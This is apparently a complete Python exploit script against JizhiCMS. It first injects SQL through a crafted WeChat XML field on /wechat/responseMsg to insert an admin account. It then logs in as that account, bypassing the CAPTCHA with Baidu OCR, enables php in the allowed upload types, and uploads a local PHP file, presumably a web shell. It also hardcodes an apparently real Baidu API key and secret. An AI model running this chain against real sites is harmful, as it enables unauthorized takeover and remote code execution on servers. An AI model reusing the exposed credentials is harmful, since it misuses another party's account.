import requests
import sys
import json
import base64


# 保证兼容python2以及python3
IS_PY3 = sys.version_info.major == 3
from urllib.request import urlopen
from urllib.request import Request
from urllib.error import URLError
from urllib.parse import urlencode
from urllib.parse import quote_plus



API_KEY = 'yymTqWldUmN1xySZpuR6gOYQ'

SECRET_KEY = 'G8Vlxd7XK43NTRC94GID9nzCCtcPics1'


OCR_URL = "https://aip.baidubce.com/rest/2.0/ocr/v1/accurate_basic"


"""  TOKEN start """
TOKEN_URL = 'https://aip.baidubce.com/oauth/2.0/token'


"""
    获取token
"""
def fetch_token():
    params = {'grant_type': 'client_credentials',
              'client_id': API_KEY,
              'client_secret': SECRET_KEY}
    post_data = urlencode(params)
    if (IS_PY3):
        post_data = post_data.encode('utf-8')
    req = Request(TOKEN_URL, post_data)
    try:
        f = urlopen(req, timeout=5)
        result_str = f.read()
    except URLError as err:
        print(err)
    if (IS_PY3):
        result_str = result_str.decode()


    result = json.loads(result_str)

    if ('access_token' in result.keys() and 'scope' in result.keys()):
        if not 'brain_all_scope' in result['scope'].split(' '):
            print ('please ensure has check the  ability')
            exit()
        return result['access_token']
    else:
        print ('please overwrite the correct API_KEY and SECRET_KEY')
        exit()

"""
    读取文件
"""
def read_file(image_path):
    f = None
    try:
        f = open(image_path, 'rb')
        return f.read()
    except:
        print('read image file fail')
        return None
    finally:
        if f:
            f.close()


"""
    调用远程服务
"""
def request(url, data):
    req = Request(url, data.encode('utf-8'))
    has_error = False
    try:
        f = urlopen(req)
        result_str = f.read()
        if (IS_PY3):
            result_str = result_str.decode()
        return result_str
    except  URLError as err:
        print(err)


def sqlInjection():
    sqlData="<?xml version='1.0'?>  <document>  <MsgType>event</MsgType>  <Event>subscribe</Event>  <FromUserName>';insert into jz_level values(999,'fff','a877cec7a6ffd70dfd313411d6196a40','1','1','1','1','1','1')#</FromUserName></document>"
    session.post(url=url+sqlRoute,data=sqlData)
    print("sql injection has completed,but I cant be sure whether it's successful.")

def loginAdmin():
    times=0
    while True:
        # 获取access token
        token = fetch_token()
        # 拼接通用文字识别高精度url
        image_url = OCR_URL + "?access_token=" + token
        r=session.get(url=url+vercodeRoute)
        #print(r.text)
        with open("tmp.png","wb") as f:
            f.write(r.content)

        vercode = ""
        # 读取书籍页面图片
        file_content = read_file('./tmp.png')
        # 调用文字识别服务
        result = request(image_url, urlencode({'image': base64.b64encode(file_content)}))
        # 解析返回结果
        result_json = json.loads(result)
        #print(result_json)
        try:
            for words_result in result_json["words_result"]:
                vercode = vercode + words_result["words"]
        except:
            pass
        # 打印文字
        #print(text)
        loginData={
            "username":"fff",
            "password":"123",
            "vercode":vercode
        }
        r=session.post(url=url+loginRoute,data=loginData)
        #print(r.text)
        returnData=json.loads(r.text)
        if "登录成功" in returnData['msg']:
            print("login successfully as admin!")
            return
        else:
            times+=1
            if times>=500:
                print("login times is more than 500,maybe sql injection is failed.")
                exit()

def changeConfig():
    configData={
        'fileType':"pdf|jpg|jpeg|png|zip|rar|gzip|doc|docx|xlsx|php"
    }
    r=session.post(url=url+configRoute,data=configData)
    returnData=json.loads(r.text)
    if "提交成功" in returnData['msg']:
        print("fileType config changes successfully.")
    else:
        print("failed to change the config.")
        exit()

def upload():
    files={
        "file":("1.php",open("feng.php","rb"))
    }
    r=session.post(url=url+uploadRoute,files=files)
    returnData=json.loads(r.text)
    if "url" in returnData:
        print(f"Successfully upload,the path is {returnData['url']}")
    else:
        print("failed to upload php file.")
        exit()


if __name__ == '__main__':
    feng=r"""
    -------------   ------------      |\              |       --------------
    |               |                 |  \            |       |
    |               |                 |    \          |       |
    |               |                 |      \        |       |    ----------
    |------------   |-----------      |        \      |       |             |
    |               |                 |          \    |       |             |
    |               |                 |            \  |       |             |
    |               -------------     |              \|       ---------------
    """
    print(feng)
    url=input("please input the url:\n")
    #url="http://www.jizhicms170.com/"
    sqlRoute="/wechat/responseMsg"
    loginRoute="/admin.php/Login/index.html"
    vercodeRoute="/admin.php/Login/vercode.html"
    configRoute="/admin.php/Sys/index.html"
    uploadRoute="/admin.php/Common/uploads.html"


    session=requests.session()


    sqlInjection()
    loginAdmin()
    changeConfig()
    upload()








